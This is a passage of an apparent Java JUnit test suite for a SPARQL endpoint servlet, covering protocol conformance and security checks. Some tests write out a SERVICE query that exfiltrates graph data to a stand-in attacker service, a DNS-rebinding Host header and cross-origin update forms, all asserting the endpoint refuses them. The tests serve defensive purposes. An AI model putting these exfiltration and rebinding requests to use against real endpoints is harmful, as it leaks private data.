package org.cqels.examples.sparql;

import org.cqels.engine.CQELSEngine;
import org.cqels.engine.DataStream;
import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.server.ServerConnector;
import org.eclipse.rdf4j.model.IRI;
import org.eclipse.rdf4j.model.ValueFactory;
import org.eclipse.rdf4j.model.impl.SimpleValueFactory;
import org.eclipse.rdf4j.repository.RepositoryConnection;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertSame;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Protocol conformance against a real Jetty on port 0 and a real engine. Each scenario that
 * needs different options (token, update, limits) starts its own endpoint over its own engine,
 * so the shared one stays read-only and unauthenticated.
 */
class SparqlProtocolServletTest {

    static final ValueFactory VF = SimpleValueFactory.getInstance();
    static final String EX = "urn:ex:";
    static final HttpClient HTTP = HttpClient.newHttpClient();

    /** A started endpoint: engine, Jetty, base URL of the servlet. */
    record Endpoint(CQELSEngine engine, Server server, String url) implements AutoCloseable {
        static Endpoint start(EndpointOptions options, int seedTriples) throws Exception {
            CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
            try (RepositoryConnection c = engine.getRepository().getConnection()) {
                c.add(iri("EV-7Q2"), iri("depot"), iri("North"));
                c.add(iri("EV-3K8"), iri("depot"), iri("West"));
                c.add(iri("g1s"), iri("p"), iri("g1o"), iri("g1"));
                c.add(iri("g2s"), iri("p"), iri("g2o"), iri("g2"));
                for (int i = 0; i < seedTriples; i++) {
                    c.add(iri("bulk" + i), iri("v"), VF.createLiteral(i));
                }
            }
            engine.start();
            Server server = SparqlEndpointLauncher.startServer(engine, "127.0.0.1", 0, options, 64, false);
            int port = ((ServerConnector) server.getConnectors()[0]).getLocalPort();
            return new Endpoint(engine, server, "http://127.0.0.1:" + port + options.path());
        }

        @Override
        public void close() throws Exception {
            server.stop();
            engine.close();
        }
    }

    static Endpoint shared;

    @BeforeAll
    static void start() throws Exception {
        shared = Endpoint.start(EndpointOptions.defaults(), 0);
    }

    @AfterAll
    static void stop() throws Exception {
        shared.close();
    }

    static IRI iri(String local) {
        return VF.createIRI(EX + local);
    }

    static String enc(String s) {
        return URLEncoder.encode(s, StandardCharsets.UTF_8);
    }

    static HttpResponse<String> get(String url, String query, String accept) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url + "?query=" + enc(query)));
        if (accept != null) {
            b.header("Accept", accept);
        }
        return HTTP.send(b.build(), HttpResponse.BodyHandlers.ofString());
    }

    static HttpResponse<String> post(String url, String contentType, String body, String accept, String... headers)
            throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url))
                .header("Content-Type", contentType)
                .POST(HttpRequest.BodyPublishers.ofString(body));
        if (accept != null) {
            b.header("Accept", accept);
        }
        for (int i = 0; i + 1 < headers.length; i += 2) {
            b.header(headers[i], headers[i + 1]);
        }
        return HTTP.send(b.build(), HttpResponse.BodyHandlers.ofString());
    }

    /** The SPARQL servlet inside a started endpoint's Jetty. */
    static SparqlProtocolServlet servletOf(Server server) throws Exception {
        var context = server.getDescendant(org.eclipse.jetty.ee10.servlet.ServletContextHandler.class);
        for (var holder : context.getServletHandler().getServlets()) {
            if (holder.getServlet() instanceof SparqlProtocolServlet s) {
                return s;
            }
        }
        throw new AssertionError("no SPARQL servlet");
    }

    static String type(HttpResponse<?> r) {
        return r.headers().firstValue("Content-Type").orElse("");
    }

    // ---- the protocol matrix ---------------------------------------------------------------

    @Test
    void selectViaGetDefaultsToJson() throws Exception {
        var r = get(shared.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> <urn:ex:North> }", null);
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/sparql-results+json"), type(r));
        assertTrue(r.body().contains("urn:ex:EV-7Q2"), r.body());
        assertFalse(r.body().contains("EV-3K8"));
    }

    @Test
    void selectViaFormPostAsXml() throws Exception {
        var r = post(shared.url(), "application/x-www-form-urlencoded",
                "query=" + enc("SELECT ?v WHERE { ?v <urn:ex:depot> ?d }"), "application/sparql-results+xml");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/sparql-results+xml"), type(r));
        assertTrue(r.body().contains("<sparql"), r.body());
    }

    @Test
    void selectViaDirectPostAsCsv() throws Exception {
        var r = post(shared.url(), "application/sparql-query",
                "SELECT ?v WHERE { ?v <urn:ex:depot> ?d } ORDER BY ?v", "text/csv");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("text/csv"), type(r));
        assertTrue(r.body().startsWith("v"), r.body());
        assertTrue(r.body().contains("urn:ex:EV-3K8"));
    }

    @Test
    void askDefaultsToJson() throws Exception {
        var r = get(shared.url(), "ASK { <urn:ex:EV-7Q2> ?p ?o }", null);
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/sparql-results+json"));
        assertTrue(r.body().replace(" ", "").contains("\"boolean\":true"), r.body());
    }

    @Test
    void constructDefaultsToTurtle() throws Exception {
        var r = get(shared.url(), "CONSTRUCT WHERE { ?s <urn:ex:depot> ?o }", null);
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("text/turtle"), type(r));
        assertTrue(r.body().contains("<urn:ex:North>"), r.body());
    }

    @Test
    void describeAsNTriples() throws Exception {
        var r = get(shared.url(), "DESCRIBE <urn:ex:EV-7Q2>", "application/n-triples");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("application/n-triples"), type(r));
        assertTrue(r.body().contains("<urn:ex:EV-7Q2> <urn:ex:depot> <urn:ex:North> ."), r.body());
    }

    @Test
    void acceptQualityOrderingIsHonoured() throws Exception {
        var r = get(shared.url(), "SELECT * WHERE { ?s ?p ?o }",
                "application/sparql-results+json;q=0.5, text/tab-separated-values;q=0.9");
        assertEquals(200, r.statusCode());
        assertTrue(type(r).startsWith("text/tab-separated-values"), type(r));
    }

    @Test
    void datasetParameterRestrictsTheDefaultGraph() throws Exception {
        String q = "SELECT ?s WHERE { ?s <urn:ex:p> ?o }";
        var all = get(shared.url(), q, null);
        assertTrue(all.body().contains("g1s") && all.body().contains("g2s"), all.body());
        var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc(q)
                + "&default-graph-uri=" + enc("urn:ex:g1"))).build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(200, r.statusCode());
        assertTrue(r.body().contains("g1s"), r.body());
        assertFalse(r.body().contains("g2s"), r.body());
    }

    // ---- refusals ---------------------------------------------------------------------------

    @Test
    void malformedQueryIs400() throws Exception {
        var r = get(shared.url(), "SELEKT nonsense", null);
        assertEquals(400, r.statusCode());
        assertTrue(r.body().startsWith("malformed query"), r.body());
    }

    @Test
    void unmatchableAcceptIs406() throws Exception {
        var r = get(shared.url(), "SELECT * WHERE { ?s ?p ?o }", "application/vnd.nothing");
        assertEquals(406, r.statusCode());
    }

    @Test
    void unknownPostContentTypeIs415() throws Exception {
        var r = post(shared.url(), "text/plain", "SELECT * WHERE { ?s ?p ?o }", null);
        assertEquals(415, r.statusCode());
    }

    @Test
    void badGraphIriIs400() throws Exception {
        // the last two pass SimpleValueFactory's colon check and ParsedIRI.create; the strict parser refuses them
        for (String bad : List.of("not-an-iri", "http://bad iri", "1:invalid")) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?query=" + enc("ASK {}")
                    + "&default-graph-uri=" + enc(bad))).build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(400, r.statusCode(), bad);
        }
    }

    @Test
    void malformedPercentEncodingIs400() throws Exception {
        var r = post(shared.url(), "application/x-www-form-urlencoded", "query=ASK%7B%7D&x=%zz", null);
        assertEquals(400, r.statusCode(), r.body());
        assertTrue(r.body().contains("percent-encoding"), r.body());
    }

    @Test
    void relativeIrisResolveAgainstTheRequestUrl() throws Exception {
        var r = get(shared.url(), "SELECT (<relative> AS ?x) WHERE {}", "text/csv");
        assertEquals(200, r.statusCode(), r.body());
        assertTrue(r.body().contains(shared.url().replace("/sparql", "/relative")), r.body());
    }

    @Test
    void updateIsForbiddenByDefaultAndNotAcceptedViaGet() throws Exception {
        var viaPost = post(shared.url(), "application/x-www-form-urlencoded",
                "update=" + enc("INSERT DATA { <urn:ex:x> <urn:ex:y> <urn:ex:z> }"), null);
        assertEquals(403, viaPost.statusCode());
        var direct = post(shared.url(), "application/sparql-update", "INSERT DATA { <urn:ex:x> <urn:ex:y> <urn:ex:z> }", null);
        assertEquals(403, direct.statusCode());
        var viaGet = HTTP.send(HttpRequest.newBuilder(URI.create(shared.url() + "?update=" + enc("INSERT DATA {}")))
                .build(), HttpResponse.BodyHandlers.ofString());
        assertEquals(405, viaGet.statusCode());
        var still = get(shared.url(), "ASK { <urn:ex:x> ?p ?o }", null);
        assertTrue(still.body().replace(" ", "").contains("\"boolean\":false"));
    }

    @Test
    void oversizedBodyIs413() throws Exception {
        try (Endpoint small = Endpoint.start(EndpointOptions.defaults().withMaxRequestBytes(64), 0)) {
            String big = "SELECT * WHERE { ?s ?p ?o } #" + "x".repeat(200);
            var direct = post(small.url(), "application/sparql-query", big, null);
            assertEquals(413, direct.statusCode());
            var form = post(small.url(), "application/x-www-form-urlencoded", "query=" + enc(big), null);
            assertEquals(413, form.statusCode());
            // Chunked: no Content-Length for the early check, so the bounded read must catch it —
            // for a form too, which the container would otherwise parse under its own limit.
            for (String type : List.of("application/x-www-form-urlencoded", "application/sparql-query")) {
                byte[] body = (type.endsWith("urlencoded") ? "query=" + enc(big) : big).getBytes(StandardCharsets.UTF_8);
                var chunked = HTTP.send(HttpRequest.newBuilder(URI.create(small.url()))
                        .header("Content-Type", type)
                        .POST(HttpRequest.BodyPublishers.ofInputStream(() -> new java.io.ByteArrayInputStream(body)))
                        .build(), HttpResponse.BodyHandlers.ofString());
                assertEquals(413, chunked.statusCode(), type);
            }
        }
    }

    // ---- outbound requests: SERVICE and LOAD ------------------------------------------------

    /** A stand-in for an attacker's SPARQL service: counts what it receives, answers an empty result. */
    static final class Remote implements AutoCloseable {
        final com.sun.net.httpserver.HttpServer server;
        final java.util.concurrent.atomic.AtomicInteger hits = new java.util.concurrent.atomic.AtomicInteger();
        final StringBuffer received = new StringBuffer();

        Remote() throws IOException {
            server = com.sun.net.httpserver.HttpServer.create(new java.net.InetSocketAddress("127.0.0.1", 0), 0);
            server.createContext("/", ex -> {
                hits.incrementAndGet();
                received.append(ex.getRequestURI()).append(' ')
                        .append(new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8));
                byte[] body = "{\"head\":{\"vars\":[]},\"results\":{\"bindings\":[]}}".getBytes(StandardCharsets.UTF_8);
                ex.getResponseHeaders().add("Content-Type", "application/sparql-results+json");
                ex.sendResponseHeaders(200, body.length);
                ex.getResponseBody().write(body);
                ex.close();
            });
            server.start();
        }

        String url() {
            return "http://127.0.0.1:" + server.getAddress().getPort() + "/sparql";
        }

        @Override
        public void close() {
            server.stop(0);
        }
    }

    /**
     * The exfiltration found reviewing #105: SERVICE makes the server itself send bindings from
     * the graph to any URL, and a cross-site {@code <img>} GET carries no Origin to stop it.
     */
    @Test
    void serviceAndLoadAreRefusedUnlessFederationIsEnabled() throws Exception {
        try (Remote remote = new Remote();
             Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            String leak = "SELECT * WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }";
            var q = get(rw.url(), leak, null);
            assertEquals(403, q.statusCode(), q.body());
            var u = post(rw.url(), "application/sparql-update",
                    "INSERT { ?v <urn:ex:seen> ?o } WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }", null);
            assertEquals(403, u.statusCode(), u.body());
            var load = post(rw.url(), "application/sparql-update", "LOAD <" + remote.url() + "/data.ttl>", null);
            assertEquals(403, load.statusCode(), load.body());
            assertEquals(0, remote.hits.get(), "the endpoint sent a request out: " + remote.received);
        }
        // and the vector is real: with federation on, the bindings do leave
        try (Remote remote = new Remote();
             Endpoint fed = Endpoint.start(EndpointOptions.defaults().withFederationEnabled(true), 0)) {
            var q = get(fed.url(), "SELECT * WHERE { ?v <urn:ex:depot> ?d . SERVICE <" + remote.url() + "> { ?v ?p ?o } }", null);
            assertEquals(200, q.statusCode(), q.body());
            assertTrue(remote.hits.get() > 0);
            assertTrue(remote.received.toString().contains("EV-7Q2"), remote.received.toString());
        }
    }

    @Test
    void crossSiteBrowserRequestsWithoutOriginAreRefused() throws Exception {
        String url = shared.url() + "?query=" + enc("ASK {}");
        for (String site : List.of("cross-site", "same-site")) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(url)).header("Sec-Fetch-Site", site).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(403, r.statusCode(), site);
        }
        for (String site : List.of("none", "same-origin")) {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(url)).header("Sec-Fetch-Site", site).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(200, r.statusCode(), site);
        }
    }

    /** java.net.http refuses to set Host, so these requests go over a raw socket. Returns the status code. */
    static int statusWithHost(String url, String host) throws IOException {
        URI u = URI.create(url);
        try (java.net.Socket socket = new java.net.Socket(u.getHost(), u.getPort())) {
            socket.setSoTimeout(5000);
            String request = "GET " + u.getRawPath() + "?query=" + enc("ASK {}") + " HTTP/1.1\r\nHost: " + host
                    + "\r\nSec-Fetch-Site: same-origin\r\nConnection: close\r\n\r\n";
            socket.getOutputStream().write(request.getBytes(StandardCharsets.US_ASCII));
            String status = new java.io.BufferedReader(new java.io.InputStreamReader(socket.getInputStream(),
                    StandardCharsets.US_ASCII)).readLine();
            return Integer.parseInt(status.split(" ")[1]);
        }
    }

    /**
     * DNS rebinding, found reviewing #105: the attacker's page is same-origin to the browser
     * (no Origin, Sec-Fetch-Site: same-origin) — only the Host header still names its domain.
     */
    @Test
    void reboundHostIsRefusedWithoutAToken() throws Exception {
        int port = URI.create(shared.url()).getPort();
        assertEquals(403, statusWithHost(shared.url(), "rebind.attacker.example:" + port));
        for (String ok : List.of("127.0.0.1:" + port, "localhost:" + port, "LOCALHOST", "[::1]:" + port)) {
            assertEquals(200, statusWithHost(shared.url(), ok), ok);
        }
        // a token defeats rebinding by itself, so no host check unless one is asked for
        try (Endpoint locked = Endpoint.start(EndpointOptions.defaults().withAuthToken("s3cret"), 0)) {
            assertEquals(401, statusWithHost(locked.url(), "rebind.attacker.example"));
        }
        // an update token alone leaves reads open, so the host check stays
        try (Endpoint writeLocked = Endpoint.start(EndpointOptions.defaults().withUpdateToken("w"), 0)) {
            assertEquals(403, statusWithHost(writeLocked.url(), "rebind.attacker.example"));
        }
        try (Endpoint named = Endpoint.start(EndpointOptions.defaults().withAllowedHosts(List.of("sparql.fleet.example")), 0)) {
            assertEquals(200, statusWithHost(named.url(), "sparql.fleet.example"));
            assertEquals(200, statusWithHost(named.url(), "localhost"));   // listed names add to the defaults
            assertEquals(403, statusWithHost(named.url(), "rebind.attacker.example"));
        }
        assertTrue(SparqlEndpointLauncher.allowedHosts("127.0.0.1",
                EndpointOptions.defaults().withAllowedHosts(List.of("*"))).isEmpty());
    }

    // ---- options that need their own endpoint ----------------------------------------------

    @Test
    void updateWhenEnabledIsVisibleToTheNextQuery() throws Exception {
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            var up = post(rw.url(), "application/sparql-update", "INSERT DATA { <urn:ex:x> <urn:ex:y> <urn:ex:z> }", null);
            assertEquals(204, up.statusCode());
            var ask = get(rw.url(), "ASK { <urn:ex:x> <urn:ex:y> <urn:ex:z> }", null);
            assertTrue(ask.body().replace(" ", "").contains("\"boolean\":true"), ask.body());
            var bad = post(rw.url(), "application/sparql-update", "INSERT GARBAGE", null);
            assertEquals(400, bad.statusCode());
        }
    }

    /** §2.2.3: protocol update datasets plus USING / WITH are an error — RDF4J would let WITH win. */
    @Test
    void updateDatasetParametersConflictingWithWithAre400() throws Exception {
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            for (String u : List.of("WITH <urn:ex:g1> DELETE { ?s ?p ?o } WHERE { ?s ?p ?o }",
                    "DELETE { GRAPH <urn:ex:g1> { ?s ?p ?o } } USING <urn:ex:g1> WHERE { ?s ?p ?o }")) {
                var r = post(rw.url() + "?using-graph-uri=" + enc("urn:ex:g2"), "application/sparql-update", u, null);
                assertEquals(400, r.statusCode(), u + " -> " + r.body());
            }
            var still = get(rw.url(), "ASK { GRAPH <urn:ex:g1> { <urn:ex:g1s> ?p ?o } }", null);
            assertTrue(still.body().replace(" ", "").contains("\"boolean\":true"), "the conflicting update ran");
            // without the conflict the parameter is applied
            var ok = post(rw.url() + "?using-graph-uri=" + enc("urn:ex:g2"), "application/sparql-update",
                    "DELETE { GRAPH <urn:ex:g2> { ?s ?p ?o } } WHERE { ?s ?p ?o }", null);
            assertEquals(204, ok.statusCode(), ok.body());
            var gone = get(rw.url(), "ASK { GRAPH <urn:ex:g2> { ?s ?p ?o } }", null);
            assertTrue(gone.body().replace(" ", "").contains("\"boolean\":false"), gone.body());
        }
    }

    /**
     * A cross-origin form POST is a CORS "simple" request: the browser sends it with no
     * preflight. Without the origin check any page could write to a loopback endpoint.
     */
    @Test
    void crossOriginFormUpdateIsRefused() throws Exception {
        try (Endpoint rw = Endpoint.start(EndpointOptions.defaults().withUpdateEnabled(true), 0)) {
            String form = "update=" + enc("INSERT DATA { <urn:ex:pwned> <urn:ex:y> <urn:ex:z> }");
            var r = post(rw.url(), "application/x-www-form-urlencoded", form, null, "Origin", "https://attacker.example");
            assertEquals(403, r.statusCode(), r.body());
            var ask = get(rw.url(), "ASK { <urn:ex:pwned> ?p ?o }", null);
            assertTrue(ask.body().replace(" ", "").contains("\"boolean\":false"), "the cross-origin update ran");
            assertEquals(204, post(rw.url(), "application/x-www-form-urlencoded", form, null).statusCode());
        }
    }

    @Test
    void bearerTokenIsEnforcedInConstantTimeShape() throws Exception {
        try (Endpoint locked = Endpoint.start(EndpointOptions.defaults().withAuthToken("s3cret"), 0)) {
            var none = get(locked.url(), "ASK {}", null);
            assertEquals(401, none.statusCode());
            assertEquals("Bearer", none.headers().firstValue("WWW-Authenticate").orElse(""));
            var wrong = post(locked.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer nope");
            assertEquals(401, wrong.statusCode());
            var right = post(locked.url(), "application/sparql-query", "ASK {}", null, "Authorization", "Bearer s3cret");
            assertEquals(200, right.statusCode());
            // health stays reachable for probes without the token
            var health = HTTP.send(HttpRequest.newBuilder(URI.create(locked.url().replace("/sparql", "/health"))).build(),
                    HttpResponse.BodyHandlers.ofString());
            assertEquals(200, health.statusCode());
        }
    }

    @Test
    void corsPreflightAnsweredForAllowedOriginOnly() throws Exception {
        try (Endpoint cors = Endpoint.start(EndpointOptions.defaults().withAllowedOrigins(List.of("https://yasgui.example")), 0)) {
            var ok = HTTP.send(HttpRequest.newBuilder(URI.create(cors.url()))
                    .method("OPTIONS", HttpRequest.BodyPublishers.noBody())
                    .header("Origin", "https://yasgui.example")
                    .header("Access-Control-Request-Method", "POST").build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(204, ok.statusCode());
            assertEquals("https://yasgui.example", ok.headers().firstValue("Access-Control-Allow-Origin").orElse(""));
            assertEquals(AccessFilters.Origins.EXPOSED, ok.headers().firstValue("Access-Control-Expose-Headers").orElse(""));
            var other = HTTP.send(HttpRequest.newBuilder(URI.create(cors.url() + "?query=" + enc("ASK {}")))
                    .header("Origin", "https://evil.example").build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(403, other.statusCode());
            assertTrue(other.headers().firstValue("Access-Control-Allow-Origin").isEmpty());
            // an error answered to an allowed origin keeps its CORS headers, so the browser can read it
            var malformed = HTTP.send(HttpRequest.newBuilder(URI.create(cors.url() + "?query=" + enc("SELEKT")))
                    .header("Origin", "https://yasgui.example").build(), HttpResponse.BodyHandlers.ofString());
            assertEquals(400, malformed.statusCode());
            assertEquals("https://yasgui.example", malformed.headers().firstValue("Access-Control-Allow-Origin").orElse(""));
        }
    }

    @Test
    void maxRowsTruncatesAndSaysSo() throws Exception {
        try (Endpoint capped = Endpoint.start(EndpointOptions.defaults().withMaxRows(2), 10)) {
            var r = get(capped.url(), "SELECT ?s WHERE { ?s <urn:ex:v> ?x }", "text/csv");
            assertEquals(200, r.statusCode());
            assertEquals("true", r.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).orElse(""));
            assertEquals(3, r.body().strip().split("\n").length, r.body());   // header + 2 rows
            var few = get(capped.url(), "SELECT ?v WHERE { ?v <urn:ex:depot> <urn:ex:North> }", "text/csv");
            assertTrue(few.headers().firstValue(SparqlProtocolServlet.TRUNCATED_HEADER).isEmpty());
        }
    }

    /**
     * A shape RDF4J 4.3.8 does interrupt: the sort over a 4-way cross product of ~300 triples
     * stops ~1 s after a 1 s limit, before any row is written, so the status can still be set.
     * A {@code COUNT} over the same join is NOT interruptible (measured: not by the limit, not by
     * closing the connection, not by interrupting the thread) — do not use it here; that is what
     * the slot cap in the next test is for.
     */
    static final String SLOW_BUT_STOPPABLE =
            "SELECT ?a WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l } ORDER BY ?a LIMIT 1";

    @Test
    void executionLimitAnswers503BeforeTheFirstRow() throws Exception {
        try (Endpoint slow = Endpoint.start(EndpointOptions.defaults().withMaxExecutionSeconds(1), 300)) {
            long t0 = System.nanoTime();
            var r = get(slow.url(), SLOW_BUT_STOPPABLE, null);
            assertEquals(503, r.statusCode(), r.body());
            assertTrue(r.body().contains("execution limit"), r.body());
            assertTrue((System.nanoTime() - t0) / 1e9 < 10, "limit took too long to trip");
        }
    }

    /**
     * The limit tripping after rows are already on the wire cannot become a 503 any more. The
     * response must then be aborted — a client must not receive a short result as a complete 200.
     */
    @Test
    void executionLimitAfterCommitAbortsTheResponse() throws Exception {
        try (Endpoint slow = Endpoint.start(EndpointOptions.defaults().withMaxExecutionSeconds(1), 300)) {
            long t0 = System.nanoTime();
            var req = HttpRequest.newBuilder(URI.create(slow.url() + "?query="
                    + enc("SELECT * WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l }"))).header("Accept", "text/csv").build();
            assertThrows(IOException.class, () -> HTTP.send(req, HttpResponse.BodyHandlers.discarding()));
            assertTrue((System.nanoTime() - t0) / 1e9 < 20, "limit took too long to trip");
        }
    }

    /** RDF4J wraps an update's timeout twice (UpdateExecutionException → SailException → QueryInterruptedException). */
    @Test
    void updateExecutionLimitIs503() throws Exception {
        try (Endpoint slow = Endpoint.start(EndpointOptions.defaults().withMaxExecutionSeconds(1).withUpdateEnabled(true), 300)) {
            var r = post(slow.url(), "application/sparql-update",
                    "DELETE { ?a ?b ?c } WHERE { { SELECT ?a ?b ?c WHERE { ?a ?b ?c . ?d ?e ?f . ?g ?h ?i . ?j ?k ?l } ORDER BY ?a LIMIT 1 } }",
                    null);
            assertEquals(503, r.statusCode(), r.body());
            assertTrue(r.body().contains("execution limit"), r.body());
        }
    }

    /**
     * Holds the first {@code holds} requests inside their query slot — the servlet asks for the
     * repository only after acquiring one — until {@link #release} opens. No sleeps: the test
     * waits on {@link #entered} for the slots to be taken.
     */
    static final class SlotHolder implements java.util.function.Supplier<org.eclipse.rdf4j.repository.Repository> {
        final CQELSEngine engine;
        final java.util.concurrent.atomic.AtomicInteger holds;
        final java.util.concurrent.CountDownLatch entered;
        final java.util.concurrent.CountDownLatch release = new java.util.concurrent.CountDownLatch(1);
        /** Keep holding through interrupts, as work that does not check for them would (Jetty interrupts on stop). */
        boolean deaf;

        SlotHolder(CQELSEngine engine, int holds) {
            this.engine = engine;
            this.holds = new java.util.concurrent.atomic.AtomicInteger(holds);
            this.entered = new java.util.concurrent.CountDownLatch(holds);
        }

        @Override
        public org.eclipse.rdf4j.repository.Repository get() {
            if (holds.getAndDecrement() > 0) {
                entered.countDown();
                while (true) {
                    try {
                        release.await();
                        break;
                    } catch (InterruptedException e) {
                        if (!deaf) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                }
            }
            return engine.getRepository();
        }
    }

    static HttpResponse<String> getWithin(String url, java.time.Duration timeout) throws Exception {
        return HTTP.send(HttpRequest.newBuilder(URI.create(url)).timeout(timeout).build(), HttpResponse.BodyHandlers.ofString());
    }

    @Test
    void concurrencyCapAnswers503WithRetryAfterAtOnce() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        SlotHolder holder = new SlotHolder(engine, 1);
        Server server = SparqlEndpointLauncher.startServer(holder, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(1), 64, false);
        try {
            String url = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort() + "/sparql";
            String ask = url + "?query=" + enc("ASK {}");
            var holdsTheSlot = HTTP.sendAsync(HttpRequest.newBuilder(URI.create(ask)).build(), HttpResponse.BodyHandlers.ofString());
            assertTrue(holder.entered.await(10, java.util.concurrent.TimeUnit.SECONDS), "the first request never took the slot");
            var turnedAway = getWithin(ask, java.time.Duration.ofSeconds(5));
            assertEquals(503, turnedAway.statusCode(), turnedAway.body());
            assertEquals("1", turnedAway.headers().firstValue("Retry-After").orElse(""));
            assertTrue(turnedAway.body().contains("too many concurrent queries"), turnedAway.body());
            holder.release.countDown();
            assertEquals(200, holdsTheSlot.get(10, java.util.concurrent.TimeUnit.SECONDS).statusCode());
            assertEquals(200, getWithin(ask, java.time.Duration.ofSeconds(5)).statusCode());   // slot released
        } finally {
            holder.release.countDown();
            server.stop();
            engine.close();
        }
    }

    /** With every slot held and the smallest pool start-up accepts, rejections and /health still answer. */
    @Test
    void fullSlotsLeaveHealthAndRejectionReachableAtTheMinimumPool() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        engine.start();
        int slots = 3;
        Server probe = SparqlEndpointLauncher.startServer(engine::getRepository, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(slots), 64, false);
        int leased = ((org.eclipse.jetty.util.thread.QueuedThreadPool) probe.getThreadPool()).getThreadPoolBudget().getLeasedThreads();
        probe.stop();
        int minimum = Math.max(8, SparqlEndpointLauncher.minimumThreads(slots, leased));

        SlotHolder holder = new SlotHolder(engine, slots);
        Server server = SparqlEndpointLauncher.startServer(holder, null, "127.0.0.1", 0,
                EndpointOptions.defaults().withMaxConcurrentQueries(slots), minimum, false);
        try {
            String base = "http://127.0.0.1:" + ((ServerConnector) server.getConnectors()[0]).getLocalPort();
            String ask = base + "/sparql?query=" + enc("ASK {}");
            List<java.util.concurrent.CompletableFuture<HttpResponse<String>>> held = new java.util.ArrayList<>();
            for (int i = 0; i < slots; i++) {
                held.add(HTTP.sendAsync(HttpRequest.newBuilder(URI.create(ask)).build(), HttpResponse.BodyHandlers.ofString()));
            }
            assertTrue(holder.entered.await(10, java.util.concurrent.TimeUnit.SECONDS), "the slots were never all taken");
            assertEquals(200, getWithin(base + "/health", java.time.Duration.ofSeconds(2)).statusCode());
            assertEquals(503, getWithin(ask, java.time.Duration.ofSeconds(2)).statusCode());
            holder.release.countDown();
            for (var f : held) {
                assertEquals(200, f.get(10, java.util.concurrent.TimeUnit.SECONDS).statusCode());
            }
        } finally {
            holder.release.countDown();
            server.stop();
            engine.close();
        }
    }

    @Test
    void fewerThreadsThanSlotsIsRefusedAtStartUp() throws Exception {
        CQELSEngine engine = CQELSEngine.builder().id("t-" + System.nanoTime()).withMemoryStore().build();
        try {
            var e = assertThrows(IllegalStateException.class, () -> SparqlEndpointLauncher.startServer(engine,
                    "127.0.0.1", 0, EndpointOptions.defaults().withMaxConcurrentQueries(16), 8, false));
            assertTrue(e.getMessage().contains("CQELS_SPARQL_MAX_THREADS"), e.getMessage());
        } finally {
            engine.close();
        }
    }

    // ---- the bridge to continuous queries ---------------------------------------------------

    @Test
    void continuousResultsWrittenBackAreQueryable() throws Exception {
        try (Endpoint e = Endpoint.start(EndpointOptions.defaults(), 0)) {
            CQELSEngine engine = e.engine();
            DataStream telemetry = engine.createStream("Telemetry");
            engine.registerCqelsQuery("""
                    REGISTER QUERY Fast AS
                    SELECT ?v ?kmh FROM STREAM Telemetry [NOW]
                    WHERE { STREAM Telemetry { ?v <urn:ex:speed> ?kmh } FILTER(?kmh > 120) }
                    """, row -> {
                try (RepositoryConnection c = engine.getRepository().getConnection()) {
                    c.add(VF.createIRI("urn:ex:alert:" + row.get("kmh")), iri("vehicle"),
                            VF.createIRI(String.valueOf(row.get("v"))));
                }
            });
            telemetry.push(VF.createStatement(iri("EV-7Q2"), iri("speed"), VF.createLiteral(135)));
            telemetry.push(VF.createStatement(iri("EV-3K8"), iri("speed"), VF.createLiteral(90)));
            boolean seen = false;
            for (int i = 0; i < 50 && !seen; i++) {
                Thread.sleep(100);
                var r = get(e.url(), "ASK { <urn:ex:alert:135> <urn:ex:vehicle> <urn:ex:EV-7Q2> }", null);
                seen = r.body().replace(" ", "").contains("\"boolean\":true");
            }
            assertTrue(seen, "the continuous query's written-back row never became visible");
